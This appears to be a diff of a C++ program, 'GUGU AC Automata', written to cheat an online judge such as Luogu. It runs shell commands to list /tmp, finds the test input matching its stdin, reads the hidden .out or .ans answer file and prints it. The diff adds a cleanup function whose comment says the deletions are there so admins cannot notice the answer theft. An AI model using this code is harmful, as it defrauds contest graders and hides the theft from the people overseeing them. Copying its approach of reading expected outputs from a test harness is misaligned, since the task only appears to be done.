@@ -1,4 +1,4 @@
-// AUTO GUGU AC
+// GUGU AC Automata v2.1
 
 #define LUOGU 1
 
@@ -45,10 +45,11 @@ bool has_suffix(const std::string& __s, const std::string& __x)
     return false;
 }
 
-#define GUGU_SCRIPT "/tmp/gugu.sh"
+#define GUGU_VERSION "2.1"
 #define GUGU_FILETREE "/tmp/cz.txt"
 #define GUGU_EXPORT "/tmp/cz.exp"
-#define GUGU_LOG "/tmp/czakioi.log"
+#define GUGU_LOG "/tmp/cz.log"
+#define GUGU_SAMPLE 1024
 
 std::string input;
 std::string ans;
@@ -57,6 +58,7 @@ std::string ans;
 void logex(const std::string& s)
 {
     LG_OFSTR fout(GUGU_LOG);
+    fout << "GUGU v" GUGU_VERSION << '\n';
     fout << s << '\n';
     exit(0);
 }
@@ -64,20 +66,12 @@ void logex(const std::string& s)
 // get file tree
 std::string file_tree()
 {
-    {
-        std::string script = \
-            "#!/bin/sh\n"
-            "# GUGU ANS SCRIPT\n"
-            "echo > " GUGU_FILETREE "\n"
-            "for f in $(ls -a -R /tmp); do\n"
-            "\techo \"$f\" >> " GUGU_FILETREE "\n"
-            "done\n";
-        LG_OFSTR fout(GUGU_SCRIPT);
-        fout << script;
-    }
-    LG_SYS("chmod +x " GUGU_SCRIPT);
+    // generate file tree
+    LG_SYS("ls -a -R /tmp > " GUGU_FILETREE);
+
     std::string s;
-    LG_SYS(GUGU_SCRIPT);
+
+    // read file tree
     {
         LG_IFSTR fin(GUGU_FILETREE);
         char ch;
@@ -88,8 +82,7 @@ std::string file_tree()
             s += ch;
         }
     }
-    LG_SYS("rm -f " GUGU_SCRIPT);
-    LG_SYS("rm -f " GUGU_FILETREE);
+
     return s;
 }
 
@@ -99,11 +92,11 @@ std::string gen_list(const std::string& tree)
     std::istringstream ss(tree);
     std::string s;
 
-    // ignore /tmp/file...
+    // ignore files just in /tmp, not in its child directories
     while (true)
     {
         std::getline(ss, s);
-        if (!ss) logex("gugu-export: list generation failed");
+        if (!ss) logex("gugu: list generation failed");
         if (has_prefix(s, "/tmp/")) break;
     }
 
@@ -112,15 +105,18 @@ std::string gen_list(const std::string& tree)
     dir.back() = '/';
     std::string ret;
 
+    // generate list from tree
     while (true)
     {
         std::getline(ss, s);
 
         if (!ss) break;
 
+        // ignore virtual directory
         if (s == "." || s == "..")
             continue;
 
+        // find directory
         if (has_prefix(s, "/tmp/"))
         {
             dir = s;
@@ -128,6 +124,7 @@ std::string gen_list(const std::string& tree)
             continue;
         }
 
+        // ignore runtime directory
         if (!has_prefix(dir, "/tmp/runtime/"))
             ret += (dir + s + '\n');
     }
@@ -140,10 +137,11 @@ bool compare(const std::string& x)
 {
     std::string s;
 
+    // get input from file
     {
         LG_IFSTR fin(x);
         char ch;
-        for (size_t i = 0; i < 1024; ++i)
+        for (size_t i = 0; i < GUGU_SAMPLE; ++i)
         {
             ch = fin.get();
             if (!fin) break;
@@ -157,6 +155,7 @@ bool compare(const std::string& x)
 // steal answer
 void steal()
 {
+    // get file list
     std::string list = gen_list(file_tree());
 
     LG_OFSTR fout(GUGU_EXPORT);
@@ -169,43 +168,52 @@ void steal()
         if (!ss) break;
         fout << s << ':';
         LG_IFSTR fin(s);
+
+        // file not matched
         if (!fin)
         {
             fout << " gugugu\n";
             continue;
         }
+
         fout << '\n';
+
+        // match file
         {
-            char ch;
-            bool in = has_suffix(s, ".in");
-            if (compare(s))
+            if (has_suffix(s, ".in") && compare(s))
             {
                 // remove "in"
                 s.pop_back(); s.pop_back();
+
+                // answer file has suffix ".out"
                 std::string tmp = s + "out";
                 if (LG_IFSTR(tmp))
                 {
                     ans = tmp;
                     return;
                 }
+
+                // answer file has suffix ".ans"
                 tmp = s + "ans";
                 if (LG_IFSTR(tmp))
                 {
                     ans = tmp;
                     return;
                 }
+
                 logex("gugu: answer not found");
             }
         }
+
         fout << '\n';
     }
 }
 
-// initialize input
-void init()
+// initialize input from std::cin
+void initialize()
 {
     char ch;
-    for (size_t i = 0; i < 1024; ++i)
+    for (size_t i = 0; i < GUGU_SAMPLE; ++i)
     {
         ch = std::cin.get();
         if (!std::cin) break;
@@ -226,10 +234,21 @@ void answer()
     }
 }
 
+// delete temporary files
+// so admins cannot realize that we are stealing answers
+void finalize()
+{
+    LG_SYS("rm -f " GUGU_FILETREE);
+    LG_SYS("rm -f " GUGU_EXPORT);
+    LG_SYS("rm -f " GUGU_LOG);
+}
+
+// main program
 int main()
 {
-    init();
+    initialize();
     steal();
     answer();
+    finalize();
     return 0;
 }
